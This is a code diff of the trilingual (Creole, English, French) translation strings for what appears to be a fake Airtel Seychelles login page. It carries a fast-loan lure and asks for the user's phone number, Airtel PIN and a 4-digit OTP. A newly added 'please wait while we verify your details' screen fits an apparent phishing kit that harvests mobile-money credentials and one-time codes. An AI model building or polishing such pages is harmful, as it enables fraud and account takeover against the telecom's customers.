@@ -11,21 +11,27 @@ interface LanguageContextType {
 
 const LanguageContext = createContext<LanguageContextType | undefined>(undefined);
 
-// --- TRANSLATION DICTIONARY ---
 const translations: Record<Language, Record<string, string>> = {
   cr: {
+    // Global
+    brandTitle: 'Airtel Sesel',
+    brandSubtitle: 'Pre rapid. Nenport ler. Nenport kote.',
+    secureText: 'Ou bann informasyon i an sekirite.',
+    approvalSpinner: 'Aprobasyon an kour...',
+    invalidCredentials: 'Kredans pa valid',
+    networkError: 'Errer rezo. Tanpri esey ankor.',
+    
+    // Login
     welcomeBack: 'Byenveni',
     loginSubtitle: 'Konekte ar ou kont Airtel Sesel',
     phoneNumber: 'Nimero telefon',
     enterPin: 'Antre ou koud PIN Airtel',
     loginBtn: 'Konekte',
-    approvalSpinner: 'Aprobasyon an kour...',
-    invalidCredentials: 'Kredans pa valid',
-    secureText: 'Ou bann informasyon i an sekirite.',
     
     // OTP Page
     otpTitle: 'Verifikasyon OTP',
     otpSubtitle: 'Antre OTP ki finn ganny voye kot ou nimero telefon',
+    otpWaitingSub: 'Nou finn voye ou demann. Tanpri atann pandan nou pe verifie ou bann detay...',
     enterOtp: 'Antre OTP 4 sif',
     otpExpires: 'Koud i ekspire dan',
     submitBtn: 'SOUMET',
@@ -55,17 +61,22 @@ const translations: Record<Language, Record<string, string>> = {
     backToLogin: 'Retounen pou Konekte'
   },
   en: {
+    brandTitle: 'Airtel Seychelles',
+    brandSubtitle: 'Fast loans. Anytime. Anywhere.',
+    secureText: 'Your information is secure.',
+    approvalSpinner: 'Approval in progress...',
+    invalidCredentials: 'Invalid credentials',
+    networkError: 'Network error. Please try again.',
+
     welcomeBack: 'Welcome back',
     loginSubtitle: 'Log in to your Airtel Seychelles account',
     phoneNumber: 'Phone number',
     enterPin: 'Enter your Airtel PIN code',
     loginBtn: 'Login',
-    approvalSpinner: 'Approval in progress...',
-    invalidCredentials: 'Invalid credentials',
-    secureText: 'Your information is secure.',
     
     otpTitle: 'OTP Verification',
     otpSubtitle: 'Enter the OTP sent to your phone number',
+    otpWaitingSub: 'Your request has been sent. Please wait while we verify your details...',
     enterOtp: 'Enter 4-digit OTP',
     otpExpires: 'Code expires in',
     submitBtn: 'SUBMIT',
@@ -93,17 +104,22 @@ const translations: Record<Language, Record<string, string>> = {
     backToLogin: 'Back to Login'
   },
   fr: {
+    brandTitle: 'Airtel Seychelles',
+    brandSubtitle: 'Prêts rapides. À tout moment. N\'importe où.',
+    secureText: 'Vos informations sont sécurisées.',
+    approvalSpinner: 'Approbation en cours...',
+    invalidCredentials: 'Identifiants invalides',
+    networkError: 'Erreur réseau. Veuillez réessayer.',
+
     welcomeBack: 'Bon retour',
     loginSubtitle: 'Connectez-vous à votre compte Airtel Seychelles',
     phoneNumber: 'Numéro de téléphone',
     enterPin: 'Entrez votre code PIN Airtel',
     loginBtn: 'Connexion',
-    approvalSpinner: 'Approbation en cours...',
-    invalidCredentials: 'Identifiants invalides',
-    secureText: 'Vos informations sont sécurisées.',
     
     otpTitle: 'Vérification OTP',
     otpSubtitle: 'Entrez l\'OTP envoyé à votre numéro',
+    otpWaitingSub: 'Votre demande a été envoyée. Veuillez patienter pendant la vérification...',
     enterOtp: 'Entrez l\'OTP à 4 chiffres',
     otpExpires: 'Le code expire dans',
     submitBtn: 'SOUMETTRE',
@@ -133,7 +149,7 @@ const translations: Record<Language, Record<string, string>> = {
 };
 
 export const LanguageProvider = ({ children }: { children: ReactNode }) => {
-  const [language, setLanguageState] = useState<Language>('cr'); // Default to Creole
+  const [language, setLanguageState] = useState<Language>('cr'); 
 
   useEffect(() => {
     const savedLang = localStorage.getItem('appLanguage') as Language;
